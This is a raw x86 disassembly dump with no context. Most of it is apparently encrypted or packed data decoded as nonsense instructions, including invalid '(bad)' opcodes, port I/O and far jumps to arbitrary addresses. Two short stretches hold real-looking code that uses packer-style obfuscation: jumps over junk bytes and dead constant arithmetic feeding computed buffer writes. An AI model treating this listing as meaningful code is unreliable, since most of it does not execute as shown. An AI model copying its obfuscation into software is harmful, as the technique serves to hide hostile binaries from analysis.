  410ade:	shl    DWORD PTR [edi],1
  410ae0:	ss aaa 
  410ae2:	pop    es
  410ae3:	xchg   ecx,eax
  410ae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ae5:	xor    ecx,esp
  410ae7:	dec    edi
  410ae8:	leave  
  410ae9:	jg     0x410aac
  410aeb:	repnz inc edx
  410aed:	cwde   
  410aee:	popf   
  410aef:	shl    DWORD PTR [eax-0x2587ba4e],cl
  410af5:	shl    BYTE PTR [edi],1
  410af7:	ror    BYTE PTR [edx+0x53],cl
  410afa:	sub    ecx,ebp
  410afc:	jae    0x410aa2
  410afe:	nop
  410aff:	jl     0x410b2c
  410b01:	mov    ebx,0xc482aa50
  410b06:	push   edx
  410b07:	fst    DWORD PTR [edx-0x27]
  410b0a:	push   ecx
  410b0b:	cmp    eax,0x894339bd
  410b10:	add    eax,0xee9f2bcd
  410b15:	xor    al,0xb
  410b17:	iret   
  410b18:	sbb    esi,DWORD PTR [ecx]
  410b1a:	data16 add BYTE PTR [eax+0x55375fc8],bl
  410b21:	in     al,0x93
  410b23:	sbb    WORD PTR [eax],dx
  410b26:	(bad)  
  410b27:	and    BYTE PTR [esp+ebx*2],al
  410b2a:	xchg   ecx,eax
  410b2b:	ins    BYTE PTR es:[edi],dx
  410b2c:	sbb    eax,0xddabe52e
  410b31:	lds    ecx,FWORD PTR [ebp-0x48]
  410b34:	mov    DWORD PTR [edx],eax
  410b36:	sahf   
  410b37:	jle    0x410b88
  410b39:	mov    ds:0x617c9b1,al
  410b3e:	outs   dx,DWORD PTR ds:[esi]
  410b3f:	jb     0x410b62
  410b41:	push   ds
  410b42:	fwait
  410b43:	sbb    DWORD PTR [ebx],ebx
  410b45:	retf   0x1678
  410b48:	test   DWORD PTR [ecx],ebp
  410b4a:	jne    0x410b0c
  410b4c:	stos   BYTE PTR es:[edi],al
  410b4d:	cmp    esi,DWORD PTR [esi-0x8d4702d]
  410b53:	mov    ebx,0x29eb554c
  410b58:	and    DWORD PTR ds:0x9a38078a,ecx
  410b5e:	outs   dx,BYTE PTR ds:[esi]
  410b5f:	xor    eax,0xfc189835
  410b64:	sbb    al,0x1
  410b66:	xchg   DWORD PTR [esi],eax
  410b68:	mov    esp,0xb83cc7f
  410b6d:	rol    eax,cl
  410b6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b70:	dec    edx
  410b71:	jl     0x410b0b
  410b73:	pusha  
  410b74:	sbb    esi,DWORD PTR [esi]
  410b76:	jmp    0x8812530
  410b7b:	stos   DWORD PTR es:[edi],eax
  410b7c:	enter  0x9e9d,0xb1
  410b80:	mov    ecx,0xcced1987
  410b85:	je     0x410bb6
  410b87:	mov    ah,0x4
  410b89:	add    DWORD PTR [esi+0xeeb51d5],esp
  410b8f:	clc    
  410b90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b91:	sub    ch,0xf8
  410b94:	je     0x410b17
  410b96:	cli    
  410b97:	jmp    0xf84d5c0d
  410b9c:	jnp    0x410b99
  410b9e:	sbb    DWORD PTR ds:0x92ac62b4,eax
  410ba4:	xor    dl,BYTE PTR [esp+ebp*8-0x26eb5c42]
  410bab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bac:	les    eax,FWORD PTR [ebx+0x767e92cf]
  410bb2:	cmc    
  410bb3:	pop    ebp
  410bb4:	sbb    BYTE PTR [edi],dl
  410bb6:	inc    edi
  410bb7:	sbb    ah,ah
  410bb9:	lds    edi,FWORD PTR [eax-0x7e]
  410bbc:	mov    ebx,DWORD PTR [edx]
  410bbe:	call   0xe4d8:0x6249de0e
  410bc5:	sbb    ebx,DWORD PTR [ebx-0x48ecbcd0]
  410bcb:	xor    BYTE PTR [edi+esi*1+0x6],dh
  410bcf:	lock ja 0x410bb4
  410bd2:	lods   al,BYTE PTR ds:[esi]
  410bd3:	jno    0x410c4f
  410bd5:	or     BYTE PTR [edi],ch
  410bd7:	ret    0x8dfd
  410bda:	push   edi
  410bdb:	inc    esp
  410bdc:	lock dec ebp
  410bde:	stos   BYTE PTR es:[edi],al
  410bdf:	hlt    
  410be0:	jp     0x410b9c
  410be2:	shl    DWORD PTR [edi],0x12
  410be5:	mov    edi,0x16cfeae3
  410bea:	(bad)  
  410beb:	cli    
  410bec:	cdq    
  410bed:	into   
  410bee:	fimul  WORD PTR [edx-0x50]
  410bf1:	mov    al,ds:0xd6410d6d
  410bf6:	jg     0x410c50
  410bf8:	and    eax,0xc2294969
  410bfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bfe:	mov    ebp,0x70ebe69
  410c03:	xchg   esi,eax
  410c04:	ins    DWORD PTR es:[di],dx
  410c06:	jle    0x410bf0
  410c08:	sbb    dl,BYTE PTR [edi+0x24]
  410c0b:	mov    esi,ecx
  410c0d:	stc    
  410c0e:	hlt    
  410c0f:	ret    
  410c10:	cmp    eax,0xe1775c83
  410c15:	data16 mov cl,0xd7
  410c18:	fwait
  410c19:	mov    esi,0x6331a8b3
  410c1e:	shr    DWORD PTR [ecx],cl
  410c20:	push   ecx
  410c21:	sar    ebx,1
  410c23:	xor    esi,DWORD PTR [ebx-0x1e]
  410c26:	pop    ebp
  410c27:	ficom  DWORD PTR [eax+0x46634ee8]
  410c2d:	inc    ecx
  410c2e:	test   al,0x6c
  410c30:	sti    
  410c31:	push   ebp
  410c32:	sbb    bh,0xe9
  410c35:	jle    0x410c46
  410c37:	mov    al,ds:0x737f7e68
  410c3c:	cwde   
  410c3d:	into   
  410c3e:	fistp  QWORD PTR [ecx-0x1d]
  410c41:	gs test eax,0xf6e9145e
  410c47:	and    al,0xfc
  410c49:	call   FWORD PTR [eax]
  410c4b:	loop   0x410c0d
  410c4d:	sar    DWORD PTR [edx-0x22],0x5e
  410c51:	jp     0x410cb2
  410c53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c54:	inc    eax
  410c55:	mov    ecx,0xb668b5f7
  410c5a:	les    ebx,FWORD PTR [ebx-0x38]
  410c5d:	mov    edi,0xf9322ce0
  410c62:	cli    
  410c63:	daa    
  410c64:	cmc    
  410c65:	or     cl,BYTE PTR [esi]
  410c67:	sub    edx,edi
  410c69:	sbb    eax,DWORD PTR [ebx]
  410c6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c6c:	push   0xffffffd1
  410c6e:	xchg   ebp,eax
  410c6f:	xchg   ebp,eax
  410c70:	jo     0x410c80
  410c72:	mov    ch,0x43
  410c74:	push   eax
  410c75:	fsubr  st(5),st
  410c77:	ds mov dl,0x1
  410c7a:	push   es
  410c7b:	mov    ch,0x18
  410c7d:	mov    ebx,0xd3aa08d6
  410c82:	stos   BYTE PTR es:[edi],al
  410c83:	xchg   DWORD PTR [ebp+0x118ccf40],edi
  410c89:	lahf   
  410c8a:	mov    al,BYTE PTR [esi-0x725147cb]
  410c90:	gs ret 0x559b
  410c94:	loopne 0x410cfc
  410c96:	jmp    0x8c5d:0xde9b2903
  410c9d:	inc    eax
  410c9e:	sti    
  410c9f:	shl    edx,cl
  410ca1:	loopne 0x410cd4
  410ca3:	or     DWORD PTR [eax+0x2f],esp
  410ca6:	scas   eax,DWORD PTR es:[edi]
  410ca7:	out    dx,al
  410ca8:	xchg   ebx,eax
  410ca9:	nop
  410caa:	adc    eax,0x88795be9
  410caf:	inc    esi
  410cb0:	mov    edi,0xa72570da
  410cb5:	sbb    BYTE PTR ss:[esi],al
  410cb8:	je     0x410ce8
  410cba:	sub    ebp,ecx
  410cbc:	jg     0x410c9b
  410cbe:	mov    DWORD PTR [ecx],eax
  410cc0:	lods   al,BYTE PTR ds:[esi]
  410cc1:	rcr    esi,0xb1
  410cc4:	sti    
  410cc5:	cmp    DWORD PTR [ebx+edi*8-0x14],edi
  410cc9:	out    0xdb,al
  410ccb:	or     eax,0x1abf0ef9
  410cd0:	pop    ebx
  410cd1:	dec    ebx
  410cd2:	lods   eax,DWORD PTR ds:[esi]
  410cd3:	mov    esp,DWORD PTR [ebp+0x7e]
  410cd6:	and    al,0xe7
  410cd8:	rcr    BYTE PTR [esi+0x29],cl
  410cdb:	cmc    
  410cdc:	ret    
  410cdd:	or     al,0x4
  410cdf:	dec    ebp
  410ce0:	adc    eax,0x5fe3d99d
  410ce5:	push   0x5f
  410ce7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ce8:	call   0x7f7d62ec
  410ced:	in     eax,dx
  410cee:	inc    ecx
  410cef:	jnp    0x410cf7
  410cf1:	add    al,0x70
  410cf3:	push   0x1361f2bf
  410cf8:	data16 jno 0x410c9e
  410cfb:	hlt    
  410cfc:	jl     0x410c8b
  410cfe:	jl     0x410cea
  410d00:	mov    ah,BYTE PTR [esi-0x80]
  410d03:	fst    QWORD PTR [esi+0x198f5a3b]
  410d09:	(bad)  
  410d0b:	push   eax
  410d0c:	add    DWORD PTR [ecx-0x68],esp
  410d0f:	gs push ds
  410d11:	and    DWORD PTR [ecx+0x19],ebx
  410d14:	iret   
  410d15:	xchg   edi,eax
  410d16:	jl     0x410cc4
  410d18:	mov    bh,0x41
  410d1a:	dec    ebx
  410d1b:	mov    ds:0x314664e6,eax
  410d20:	dec    edx
  410d21:	and    BYTE PTR [eax],al
  410d23:	fisubr WORD PTR [eax-0x4e2a2112]
  410d29:	mov    ah,0xb4
  410d2b:	mov    eax,ds:0xae655330
  410d30:	mov    cl,0x72
  410d32:	or     ebp,edi
  410d34:	pop    es
  410d35:	outs   dx,BYTE PTR ds:[esi]
  410d36:	sbb    eax,0xe787ce5f
  410d3b:	inc    ecx
  410d3c:	or     BYTE PTR [esi-0x3c],al
  410d3f:	mov    DWORD PTR [ebp-0x4],edi
  410d42:	mov    DWORD PTR [ebp-0xc],0x2c8a
  410d49:	mov    ecx,DWORD PTR [ebp-0xc]
  410d4c:	mov    eax,0x4401
  410d51:	sub    eax,ecx
  410d53:	jmp    0x411033
  410d58:	test   eax,0x82368522
  410d5d:	mov    ss:0x6b32522,al
  410d63:	push   0xffffffce
  410d65:	call   0x82ae785e
  410d6a:	sbb    BYTE PTR [eax],bl
  410d6c:	call   0x8120:0xa7181814
  410d73:	sub    al,dh
  410d75:	mov    ch,0x43
  410d77:	arpl   sp,bx
  410d79:	cdq    
  410d7a:	ds push ecx
  410d7c:	pop    esp
  410d7d:	mov    esp,0xfe99cfed
  410d82:	pop    edx
  410d83:	xchg   ebx,eax
  410d84:	jl     0x410de0
  410d86:	out    0x13,al
  410d88:	push   ebx
  410d89:	imul   edi,DWORD PTR [ebx-0x59],0x2579488f
  410d90:	jae    0x410dc5
  410d92:	xchg   ebp,eax
  410d93:	cmc    
  410d94:	mov    WORD PTR [eax],fs
  410d96:	mov    bh,0x9a
  410d98:	sbb    DWORD PTR [ecx+edx*4],esp
  410d9b:	cli    
  410d9c:	pop    esp
  410d9d:	fiadd  DWORD PTR [edi]
  410d9f:	cmc    
  410da0:	xchg   esi,eax
  410da1:	dec    edx
  410da2:	jmp    0xe95:0x143e875f
  410da9:	cdq    
  410daa:	(bad)  [edx-0x69]
  410dad:	sub    esp,DWORD PTR [eax+0x1c398ed4]
  410db3:	sahf   
  410db4:	mov    DWORD PTR [eax+0x59],ebx
  410db7:	mov    ds:0xa73d20d3,al
  410dbc:	adc    al,0x49
  410dbe:	data16 or dh,al
  410dc1:	mov    ds:0xa0abce05,al
  410dc6:	mov    bh,0xd8
  410dc8:	and    BYTE PTR gs:[ecx-0x164408ed],dl
  410dcf:	dec    ecx
  410dd0:	pop    ss
  410dd1:	push   edx
  410dd2:	sbb    esp,ecx
  410dd4:	push   edx
  410dd5:	leave  
  410dd6:	dec    edx
  410dd7:	sbb    BYTE PTR [edi+0xd1613e9],0xa5
  410dde:	xchg   esi,eax
  410ddf:	jnp    0x410e40
  410de1:	stos   DWORD PTR es:[edi],eax
  410de2:	cmp    ecx,esi
  410de4:	xchg   ebp,eax
  410de5:	jae    0x410d6b
  410de7:	dec    edi
  410de8:	sub    edx,esp
  410dea:	jae    0x410e3b
  410dec:	out    dx,eax
  410ded:	cld    
  410dee:	sbb    al,0x42
  410df0:	dec    esi
  410df1:	xchg   DWORD PTR [ecx],ecx
  410df3:	add    DWORD PTR [edi+0x67],0xffffff89
  410df7:	pop    esp
  410df8:	jmp    0x410e35
  410dfa:	xor    ch,bl
  410dfc:	stos   BYTE PTR es:[edi],al
  410dfd:	loop   0x410e71
  410dff:	aad    0xcd
  410e01:	cli    
  410e02:	outs   dx,BYTE PTR ds:[esi]
  410e03:	cmp    BYTE PTR [eax+edi*1-0x6a],al
  410e07:	inc    esp
  410e08:	cmp    eax,0x250af92
  410e0d:	sbb    al,0xc7
  410e0f:	jns    0x410d95
  410e11:	std    
  410e12:	dec    esi
  410e13:	jns    0x410e4d
  410e15:	sbb    BYTE PTR [ebx-0x26],0x59
  410e19:	gs mov edx,0xa8e0edd2
  410e1f:	lods   eax,DWORD PTR ds:[esi]
  410e20:	add    dl,ch
  410e22:	mov    cl,BYTE PTR [ecx+esi*2-0x66]
  410e26:	fcmovu st,st(3)
  410e28:	jp     0x410dbb
  410e2a:	loope  0x410e3a
  410e2c:	pop    ebp
  410e2d:	adc    al,BYTE PTR [ebx]
  410e2f:	xchg   edi,eax
  410e30:	jae    0x410e74
  410e32:	stos   BYTE PTR es:[edi],al
  410e33:	mov    ebx,0xa99ccc3a
  410e38:	retf   0xc40f
  410e3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e3c:	inc    edx
  410e3d:	pop    es
  410e3e:	push   esi
  410e3f:	mov    al,0xd0
  410e41:	jnp    0x410e70
  410e43:	ret    0x92f
  410e46:	cmp    BYTE PTR [edi-0x4102ffcf],0x2f
  410e4d:	add    eax,0xdb7b4c54
  410e52:	retf   
  410e53:	add    BYTE PTR [esi-0x7192e94b],ch
  410e59:	jnp    0x410de2
  410e5b:	adc    eax,0xec0df6df
  410e60:	ins    BYTE PTR es:[edi],dx
  410e61:	rol    DWORD PTR [esi],1
  410e63:	sar    DWORD PTR [esi+0x37],cl
  410e66:	into   
  410e67:	lds    ebx,FWORD PTR [ebp-0x3bc29e1a]
  410e6d:	pop    eax
  410e6e:	xchg   ebp,eax
  410e6f:	lahf   
  410e70:	pushf  
  410e71:	jle    0x410e4b
  410e73:	add    al,0x62
  410e75:	adc    eax,0x21f46ef1
  410e7a:	ss loopne 0x410e7a
  410e7d:	cld    
  410e7e:	jne    0x410e91
  410e80:	or     eax,0xf4cb059
  410e85:	ret    
  410e86:	mov    al,BYTE PTR [esi+esi*2-0x65328a8b]
  410e8d:	xchg   ebp,eax
  410e8e:	xchg   esp,eax
  410e8f:	test   al,0xcb
  410e91:	xor    BYTE PTR [ecx-0x62],dl
  410e94:	pop    ss
  410e95:	pop    eax
  410e96:	aas    
  410e97:	jmp    0xda38bb9b
  410e9c:	jge    0x410e89
  410e9e:	out    0x56,al
  410ea0:	in     al,dx
  410ea1:	adc    BYTE PTR [esi-0x7f66740e],ah
  410ea7:	hlt    
  410ea8:	push   esi
  410ea9:	mov    esp,0x3c66a6ff
  410eae:	jae    0x410e3d
  410eb0:	loope  0x410e5d
  410eb2:	mov    cs,WORD PTR [ebx+eax*4+0x5572edbb]
  410eb9:	lods   al,BYTE PTR ds:[esi]
  410eba:	pop    eax
  410ebb:	xor    esp,0xdca72cac
  410ec1:	sub    esp,esi
  410ec3:	retf   
  410ec4:	enter  0x25ec,0x2f
  410ec8:	mov    eax,0x9671f244
  410ecd:	pop    ds
  410ece:	retf   
  410ecf:	and    al,0xfa
  410ed1:	inc    ecx
  410ed2:	pop    eax
  410ed3:	out    0x31,eax
  410ed5:	in     eax,dx
  410ed6:	rcr    ebp,0x4e
  410ed9:	dec    ebx
  410eda:	imul   ebp,esi,0x3c
  410edd:	inc    ebp
  410ede:	mov    bh,BYTE PTR [ebx-0x7755d36f]
  410ee4:	imul   ebx,DWORD PTR [esi-0x57],0xffffff9f
  410ee8:	xor    bl,dl
  410eea:	cmp    edx,DWORD PTR [ebp-0x18]
  410eed:	sub    al,0x67
  410eef:	pop    ss
  410ef0:	pop    edx
  410ef1:	in     al,dx
  410ef2:	push   esp
  410ef3:	rol    esp,cl
  410ef5:	je     0x410f44
  410ef7:	cld    
  410ef8:	add    edx,edi
  410efa:	pop    ss
  410efb:	pushf  
  410efc:	push   ds
  410efd:	and    DWORD PTR [ecx],ebp
  410eff:	push   ebx
  410f00:	mov    ds:0x49426513,eax
  410f05:	xchg   edx,eax
  410f06:	dec    edi
  410f07:	inc    ebp
  410f08:	ds in  eax,0x7
  410f0b:	cs aad 0x36
  410f0e:	imul   edx,DWORD PTR [ebp-0x29c45ee7],0x6e
  410f15:	sbb    ecx,DWORD PTR [ecx]
  410f17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f18:	xlat   BYTE PTR ds:[ebx]
  410f19:	(bad)  
  410f1a:	jle    0x410f5f
  410f1c:	jle    0x410ef9
  410f1e:	xchg   ebp,eax
  410f1f:	sbb    dh,BYTE PTR [ebx]
  410f21:	hlt    
  410f22:	imul   edx,DWORD PTR [eax-0x49b0b9a4],0xfffffff8
  410f29:	sti    
  410f2a:	push   ss
  410f2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f2c:	xor    DWORD PTR [ebp+0xe],edx
  410f2f:	sbb    ebx,DWORD PTR [esi]
  410f31:	pop    ebx
  410f32:	ins    BYTE PTR es:[edi],dx
  410f33:	sub    DWORD PTR [ecx],ebp
  410f35:	cmp    eax,0x4aa21396
  410f3a:	out    0xd1,eax
  410f3c:	es lock inc ebx
  410f3f:	lahf   
  410f40:	mul    esi
  410f42:	mov    ebx,0x862f1cae
  410f47:	push   edi
  410f48:	leave  
  410f49:	outs   dx,DWORD PTR ds:[esi]
  410f4a:	fdiv   QWORD PTR [edx]
  410f4c:	and    dl,BYTE PTR [edx]
  410f4e:	mov    edx,0x6e9f4457
  410f53:	jb     0x410ee0
  410f55:	xchg   ebx,eax
  410f56:	lods   eax,DWORD PTR ds:[esi]
  410f57:	sar    BYTE PTR [ebx-0x35f9b0d5],0x57
  410f5e:	cmp    eax,DWORD PTR [ebx+0x6d0c905a]
  410f64:	pop    ebp
  410f65:	inc    esp
  410f66:	push   es
  410f67:	jmp    0x2a7a:0x94a4ca1d
  410f6e:	icebp  
  410f6f:	repz ret 0x139d
  410f73:	xor    al,0x6c
  410f75:	ret    0x9fe7
  410f78:	outs   dx,DWORD PTR ds:[esi]
  410f79:	(bad)  [ebx+0x15]
  410f7c:	sbb    BYTE PTR [esi+0x52426e75],bh
  410f82:	add    al,0xe1
  410f84:	push   esp
  410f85:	aas    
  410f86:	adc    DWORD PTR [ebp-0x26],ebx
  410f89:	(bad)  [edi-0x32]
  410f8c:	push   ebp
  410f8d:	(bad)  
  410f8e:	jg     0x410f6c
  410f90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f91:	leave  
  410f92:	jno    0x411004
  410f94:	retf   0xaf1b
  410f97:	add    dh,BYTE PTR [ebp*1-0x2b55d522]
  410f9e:	fnsave [ebp+0x71]
  410fa1:	pop    ebx
  410fa2:	or     dh,al
  410fa4:	adc    BYTE PTR [eax+0x72f6b6c4],al
  410faa:	jge    0x410fe0
  410fac:	or     eax,0x65af8a4c
  410fb1:	cmc    
  410fb2:	dec    ebp
  410fb3:	jmpw   0x3d46
  410fb7:	popa   
  410fb8:	stos   DWORD PTR es:[edi],eax
  410fb9:	sahf   
  410fba:	aad    0xe3
  410fbc:	inc    ebx
  410fbd:	mov    ebp,DWORD PTR [ecx-0x40cfc175]
  410fc3:	aad    0x87
  410fc5:	mov    BYTE PTR [ebp+0x3b],bh
  410fc8:	or     ah,BYTE PTR [esp+ecx*4-0x3612baea]
  410fcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fd0:	int    0x8b
  410fd2:	mov    eax,ds:0x330d1a87
  410fd7:	jne    0x410ff8
  410fd9:	push   edi
  410fda:	and    eax,0xb4b2ead0
  410fdf:	js     0x41104f
  410fe1:	rcl    ch,cl
  410fe3:	dec    edi
  410fe4:	(bad)  
  410fe5:	shl    DWORD PTR [edx-0x49],1
  410fe8:	icebp  
  410fe9:	xor    BYTE PTR [ebx+0x61c3bfb3],al
  410fef:	mov    esp,0xdd3094ef
  410ff4:	aad    0x8
  410ff6:	mov    dl,0x39
  410ff8:	or     bh,al
  410ffa:	xchg   ebx,eax
  410ffb:	sub    BYTE PTR [edi+0x490c8e49],cl
  411001:	jne    0x411017
  411003:	xchg   edi,eax
  411004:	mov    edi,DWORD PTR [ebx+0x3059921e]
  41100a:	or     BYTE PTR [edx-0x282e8127],ah
  411010:	dec    ebp
  411011:	repnz mov dl,BYTE PTR [esi-0x61]
  411015:	lock mov al,0x89
  411018:	or     eax,0xe7ef7269
  41101d:	inc    edx
  41101e:	jnp    0x410fa6
  411020:	mov    ds:0xfc35b035,eax
  411025:	xor    edx,0xffffffbd
  411028:	jmp    0x2ded:0x3648000b
  41102f:	hlt    
  411030:	pop    edi
  411031:	inc    edi
  411032:	std    
  411033:	mov    ecx,DWORD PTR [ebp-0x4]
  411036:	xor    edx,edx
  411038:	div    ecx
  41103a:	mov    ecx,DWORD PTR [ebp-0x14]
  41103d:	xor    eax,0xa80
  411042:	or     eax,0x343b
  411047:	or     eax,ecx
  411049:	mov    ecx,DWORD PTR [ebp+0x8]
  41104c:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  411053:	mov    DWORD PTR [ebp-0xc],0x327f
  41105a:	mov    DWORD PTR [ebp-0x14],0x5215
  411061:	mov    DWORD PTR [ebp+0x8],0x2502
  411068:	mov    eax,DWORD PTR [ebp+0x8]
  41106b:	add    eax,DWORD PTR [ebp-0x14]
  41106e:	mov    ecx,DWORD PTR [ebp-0xc]
  411071:	and    eax,0x2bab
  411076:	lea    eax,[eax+ecx*1-0x557f]
  41107d:	mov    ecx,DWORD PTR [ebp+0xc]
  411080:	mov    DWORD PTR [esi+eax*4],ecx
  411083:	mov    DWORD PTR [ebp-0xc],edi
  411086:	mov    DWORD PTR [ebp+0x8],0x5f40
  41108d:	mov    DWORD PTR [ebp-0x14],0x6ba4
  411094:	mov    DWORD PTR [ebp+0xc],0x7b17
  41109b:	mov    ecx,DWORD PTR [ebp+0x8]
  41109e:	mov    eax,0x43d2
  4110a3:	sub    eax,ecx
  4110a5:	add    eax,DWORD PTR [ebp+0xc]
  4110a8:	xor    edx,edx
  4110aa:	add    eax,DWORD PTR [ebp-0x14]
  4110ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4110b0:	div    ecx
  4110b2:	mov    ecx,DWORD PTR [ebp+0x10]
  4110b5:	xor    edx,edx
  4110b7:	pop    edi
  4110b8:	pop    ebx
  4110b9:	or     eax,0x67ad
  4110be:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  4110c5:	mov    DWORD PTR [ebp+0x10],0x517b
  4110cc:	mov    DWORD PTR [ebp+0xc],0x5d62
  4110d3:	mov    DWORD PTR [ebp+0x8],0x41b0
  4110da:	mov    ecx,DWORD PTR [ebp+0x8]
  4110dd:	mov    eax,DWORD PTR [ebp+0xc]
  4110e0:	and    ecx,0x68c1
  4110e6:	sub    ecx,0x6fd3
  4110ec:	or     ecx,eax
  4110ee:	mov    eax,DWORD PTR [ebp+0x10]
  4110f1:	imul   ecx,eax
  4110f4:	mov    eax,0xf52840d5
  4110f9:	div    ecx
  4110fb:	leave  
  4110fc:	ret    0xc
  4110ff:	push   ebp
  411100:	mov    ebp,esp
  411102:	sub    esp,0xc0
  411108:	push   esi
  411109:	mov    DWORD PTR [ebp-0x80],0x2f93
  411110:	mov    DWORD PTR [ebp-0x7c],0x3321
  411117:	mov    DWORD PTR [ebp-0x70],0x7d00
  41111e:	mov    DWORD PTR [ebp-0x6c],0xd87
  411125:	mov    DWORD PTR [ebp-0x60],0x4197
  41112c:	mov    DWORD PTR [ebp-0x5c],0xa7d
  411133:	mov    DWORD PTR [ebp-0x50],0x772d
  41113a:	mov    DWORD PTR [ebp-0x4c],0x37d8
  411141:	mov    DWORD PTR [ebp-0x40],0x414a
  411148:	mov    DWORD PTR [ebp-0x3c],0x55ef
  41114f:	mov    DWORD PTR [ebp-0x30],0x136b
  411156:	mov    DWORD PTR [ebp-0x2c],0x53e4
  41115d:	mov    DWORD PTR [ebp-0x20],0x32d8
  411164:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  41116b:	mov    DWORD PTR [ebp-0xc],0x3956
  411172:	mov    DWORD PTR [ebp-0xa4],0x4e57
  41117c:	mov    DWORD PTR [ebp-0x94],0x1
  411186:	mov    DWORD PTR [ebp-0x14],0x17ab
  41118d:	mov    DWORD PTR [ebp-0x64],0x7a3d
  411194:	mov    DWORD PTR [ebp-0x54],0x378a
  41119b:	mov    DWORD PTR [ebp-0x74],0x5a00
  4111a2:	mov    DWORD PTR [ebp-0x24],0x1f3a
  4111a9:	mov    DWORD PTR [ebp-0x84],0x9a225
  4111b3:	mov    DWORD PTR [ebp-0x44],0x31f8
  4111ba:	mov    DWORD PTR [ebp-0x34],0x3663
  4111c1:	mov    DWORD PTR [ebp-0xb4],0x3165
  4111cb:	mov    DWORD PTR [ebp-0xc0],0x1ebe
  4111d5:	mov    DWORD PTR [ebp-0xbc],0x43cc
  4111df:	jmp    0x411454
  4111e4:	mov    ecx,0x1c975440
  4111e9:	jnp    0x41119d
  4111eb:	push   ds
  4111ec:	jl     0x41125d
  4111ee:	mov    esi,DWORD PTR [eax-0x32]
  4111f1:	sar    BYTE PTR [ebp-0x50],0xee
  4111f5:	jl     0x41120f
  4111f7:	sbb    BYTE PTR [ecx+0x14],dh
  4111fa:	sbb    BYTE PTR [eax],bl
  4111fc:	test   eax,0x2a2fa1c1
  411201:	dec    esp
  411202:	dec    ebp
  411203:	leave  
  411204:	shl    DWORD PTR [eax+0x49],0xdc
  411208:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411209:	xchg   ebx,eax
  41120a:	mov    dl,0xd4
  41120c:	inc    esi
  41120d:	jo     0x411269
  41120f:	fsubr  DWORD PTR [ebx+0x7119c44d]
  411215:	(bad)  
  411216:	ficomp DWORD PTR [eax-0x3cab6228]
  41121c:	in     al,0xfc
  41121e:	sub    DWORD PTR [ecx],ebx
  411220:	sbb    bl,ah
  411222:	out    0xf8,al
  411224:	add    BYTE PTR [edx],0xcc
  411227:	(bad)  
  411228:	jl     0x4111e0
  41122a:	adc    eax,0xc01ee026
  41122f:	sbb    eax,0x338cc978
  411234:	es xchg ecx,eax
  411236:	enter  0x978d,0x39
  41123a:	(bad)  
  41123b:	cmp    eax,0x710761fc
  411240:	or     ah,BYTE PTR [edi+eax*1]
  411243:	sti    
  411244:	outs   dx,DWORD PTR ds:[esi]
  411245:	jns    0x411232
  411247:	into   
  411248:	outs   dx,BYTE PTR ds:[esi]
  411249:	sub    al,0xe0
  41124b:	in     al,0x5
  41124d:	and    DWORD PTR [esi-0x3e],0x63
  411251:	repz or eax,0xa3e81356
  411257:	inc    ebp
  411258:	mov    BYTE PTR [eax],bh
  41125a:	ins    DWORD PTR es:[edi],dx
  41125b:	pop    edx
  41125c:	popf   
  41125d:	enter  0xfd64,0xc
  411261:	push   0x32f8d053
  411266:	push   eax
  411267:	fwait
  411268:	and    al,0xf4
  41126a:	adc    DWORD PTR [eax-0x45],ecx
  41126d:	pushf  
  41126e:	xchg   ebp,eax
  41126f:	div    BYTE PTR [esi+ebx*1-0x5d]
  411273:	jnp    0x411258
  411275:	mov    ch,0x5e
  411277:	fisttp WORD PTR [esi-0xc258b9b]
  41127d:	js     0x41125a
  41127f:	dec    edx
  411280:	or     ecx,DWORD PTR [edi]
  411282:	cs mov edx,0x15641f40
  411288:	out    dx,eax
  411289:	sbb    bh,BYTE PTR [eax]
  41128b:	ins    DWORD PTR es:[edi],dx
  41128c:	mov    al,0xc4
  41128e:	jb     0x4112ba
  411290:	stos   BYTE PTR es:[edi],al
  411291:	mov    BYTE PTR [ebx-0x3e],bl
  411294:	jle    0x4112d5
  411296:	add    DWORD PTR [ebx],ebp
  411298:	or     DWORD PTR [esi],0x3cc93c85
  41129e:	jecxz  0x4112dc
  4112a0:	inc    BYTE PTR [esi-0x6d]
  4112a3:	in     eax,dx
  4112a4:	fld    TBYTE PTR [edi-0x3b]
  4112a7:	adc    DWORD PTR [edx-0x79],ecx
  4112aa:	test   eax,0x9a707dcb
  4112af:	(bad)  
  4112b0:	sbb    al,ah
  4112b2:	sti    
  4112b3:	dec    ecx
  4112b4:	push   ecx
  4112b5:	(bad)  
  4112b6:	out    dx,al
  4112b7:	mov    eax,cs:0x6bbac596
  4112bd:	into   
  4112be:	inc    esp
  4112bf:	ins    DWORD PTR es:[edi],dx
  4112c0:	mov    WORD PTR [ebx-0x3c],gs
  4112c3:	sub    eax,0xac62091f
  4112c8:	fisub  DWORD PTR [ebx-0x3d]
  4112cb:	aam    0x3b
  4112cd:	ds push ebx
  4112cf:	stc    
  4112d0:	inc    eax
  4112d1:	and    ecx,DWORD PTR [eax]
  4112d3:	(bad)  
  4112d4:	lahf   
  4112d5:	and    cl,bl
  4112d7:	push   eax
  4112d8:	sub    ebp,edx
  4112da:	sub    DWORD PTR [ebx],edx
  4112dc:	mov    ch,0x5f
  4112de:	sub    eax,0xa3edf0e2
  4112e3:	push   edi
  4112e4:	sbb    DWORD PTR [eax],ecx
  4112e6:	and    DWORD PTR [edi+0x15d066fa],eax
  4112ec:	adc    esp,DWORD PTR [eax]
  4112ee:	fmul   DWORD PTR [esi+eiz*8+0x2f9ff821]
  4112f5:	xor    al,dl
  4112f7:	push   0xffffffe1
  4112f9:	loop   0x411303
